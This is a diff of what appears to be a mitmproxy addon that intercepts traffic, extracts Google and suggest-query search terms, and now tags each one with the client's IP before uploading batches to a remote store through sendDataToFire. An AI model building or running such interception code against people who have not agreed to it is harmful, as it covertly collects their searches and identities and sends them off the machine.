@@ -16,7 +16,7 @@ data = {
 def request (flow: http.HTTPFlow) -> None:
     global data
     
-    data["client"] = flow.client_conn.address[0]
+    #data["client"] = flow.client_conn.address[0]
 
 
 
@@ -25,7 +25,9 @@ def request (flow: http.HTTPFlow) -> None:
             s = flow.request.path
             s = s[s.find('q=')+2:]
             s = s[:s.find('&')]
-            data["google"].append(s.replace('+', ' '))
+            #data["google"].append(s.replace('+', ' '))
+            ip = flow.client_conn.address[0]
+            data["google"].append((ip, s.replace('+', ' ')))
     elif (flow.request.url[:50] == "https://suggestqueries.google.com/complete/search?" and flow.request.method == 'GET'):
         ys = flow.request.path
         ys = ys[ys.find('q=')+2:]
@@ -56,9 +58,9 @@ def send_to_fire():
     while True:
         try:
             if(len(data["google"])== 0 and len(data["youtube"]) == 0 and len(data["web"]) == 0):
-                time.sleep(10)
+                time.sleep(5)
             if(len(data["google"]) > 0):
-                sendDataToFire("Google", json.dumps(data["google"]))
+                sendDataToFire("Google", data["google"])
                 clear_data(data, "Google")
             if(len(data["youtube"])>0):
                 sendDataToFire("YouTube", data["youtube"])
